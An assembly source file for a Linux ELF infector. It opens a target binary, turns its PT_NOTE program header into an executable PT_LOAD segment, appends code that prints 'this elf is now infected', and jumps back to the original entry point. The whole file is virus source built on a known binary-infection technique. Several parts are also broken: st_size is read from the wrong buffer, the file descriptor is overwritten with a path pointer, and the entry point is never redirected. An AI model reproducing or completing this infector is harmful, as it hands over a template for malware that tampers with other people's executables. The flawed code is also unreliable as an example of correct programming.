section .bss
buffer resb 10000            ; Reserve 10KB for the ELF file
statbuf resb 144             ; Reserve space for struct stat (144 bytes)

section .data
    infect_msg db "this elf is now infected", 0xa  ; Message with newline

section .text
global _start

_start:
    ; -------- Parse command line arguments --------
    mov rdi, [rsp + 16]       ; argv[1] (path to ELF file)
    test rdi, rdi
    jz exit_usage

    ; -------- Open the file --------
    mov rax, 2                ; sys_open
    mov rsi, 2                ; O_RDWR (Read + Write)
    syscall
    cmp rax, 0
    js exit_error
    mov rdi, rax              ; Save file descriptor

    ; -------- Retrieve file metadata (fstat) --------
    lea rsi, [statbuf]        ; Pointer to statbuf
    mov rax, 5                ; sys_fstat
    syscall
    cmp rax, 0
    js exit_error

    ; -------- Read file into buffer --------
    lea rsi, [buffer]         ; Address of buffer
    mov rdx, 10000            ; Buffer size
    mov rax, 0                ; sys_read
    syscall
    cmp rax, 0
    js exit_error
    mov rbx, rax              ; Save number of bytes read
    mov r15, buffer           ; r15 = base of the ELF buffer
    
    ; -------- Save original entry point (e_entry) --------
    mov r14, [r15 + 0x18]         ; r14 now holds the original e_entry value
    
    ; -------- Parse Program Header Table --------
parse_phdr:
    xor rcx, rcx              ; rcx = 0 (counter for entries)
    xor rdx, rdx              ; Store entry size

    mov cx, word [r15 + 0x38] ; e_phnum: Number of program headers
    mov rbx, qword [r15 + 0x20] ; e_phoff: Offset of program header table
    mov dx, word [r15 + 0x36] ; e_phentsize: Size of each program header

    lea rbx, [r15 + rbx]      ; rbx = Address of first program header

loop_phdr:
    ; Searching for PT_NOTE (ignore this part, it's already working)
    cmp rcx, 0
    jle phdr_not_found

    mov eax, dword [rbx + 0x00] ; e_phdr.type
    cmp eax, 0x4              ; Check for PT_NOTE
    je pt_note_found

    add rbx, rdx              ; Move to next Program Header
    dec rcx
    jmp loop_phdr

pt_note_found:
    ; -------- Modify PT_NOTE to PT_LOAD --------
    mov dword [rbx + 0x00], 0x1   ; Change p_type to PT_LOAD (1)
    mov dword [rbx + 0x04], 0x5   ; Set p_flags to PF_X | PF_R (0x5)

    ; -------- Calculate and set virtual address (p_vaddr) --------
    mov rax, [r15 + 48]           ; Load stat.st_size (size of the ELF)
    add rax, 0x1000               ; Add 4KB to align (instead of 0xc000000)
    and rax, 0xFFFFFFFFFFFFF000   ; Align to 4KB boundary
    mov qword [rbx + 0x10], rax   ; Set p_vaddr
    mov qword [rbx + 0x18], rax   ; Set p_paddr

    ; -------- Update p_offset to Point to EOF --------
    mov rax, 8                   ; SYS_LSEEK
    mov rdi, [rsp + 16]          ; File descriptor
    xor rsi, rsi                 ; Offset = 0
    mov rdx, 2                   ; SEEK_END
    syscall                      ; rax = EOF offset
    mov qword [rbx + 0x08], rax  ; Set p_offset (phdr.offset) to EOF

    ; -------- Adjust p_filesz and p_memsz --------
    mov rdx, v_stop - v_start    ; Calculate injected code size
    add qword [rbx + 0x20], rdx  ; Increment p_filesz by injected code size
    add qword [rbx + 0x28], rdx  ; Increment p_memsz by injected code size

    ; -------- Set p_align --------
    mov qword [rbx + 0x30], 0x1000 ; Set p_align to 4KB (0x1000)

    ; -------- Copy Injected Code into the File --------
    mov rdi, [rsp + 16]          ; File descriptor
    mov rsi, 0                   ; Offset = 0
    mov rdx, 2                   ; SEEK_END (go to the end of the file)
    mov rax, 8                   ; sys_lseek
    syscall                      ; Move file descriptor to EOF

    ; Use a proper address calculation and copy injected code
    lea rsi, [rel v_start]       ; Get the relative address of injected code
    mov rdx, v_stop - v_start    ; rdx = size of injected code
    mov rax, 18                  ; sys_pwrite64 (write to a specific file offset)
    syscall                      ; Write the injected code to the file

v_start:
    ; -------- Injected Code (Print Message) --------
    mov rax, 1                   ; sys_write
    mov rdi, 1                   ; STDOUT
    lea rsi, [rel infect_msg]    ; Address of the message
    mov rdx, 26                  ; Length of the message
    syscall                      ; Write the message to STDOUT

    ; -------- Jump Back to Original Entry Point --------
    mov rax, r14                 ; Original entry point (e_entry)
    jmp rax                      ; Jump back to the original program
v_stop:

    ; -------- Exit Normally --------
    mov rax, 60                  ; sys_exit
    xor rdi, rdi                 ; Exit code 0
    syscall

phdr_not_found:
    ; Program header not found
    mov rax, 60                  ; sys_exit
    mov rdi, 2
    syscall

exit_usage:
    mov rax, 60                  ; sys_exit
    mov rdi, 1
    syscall

exit_error:
    mov rax, 60                  ; sys_exit
    mov rdi, 3
    syscall

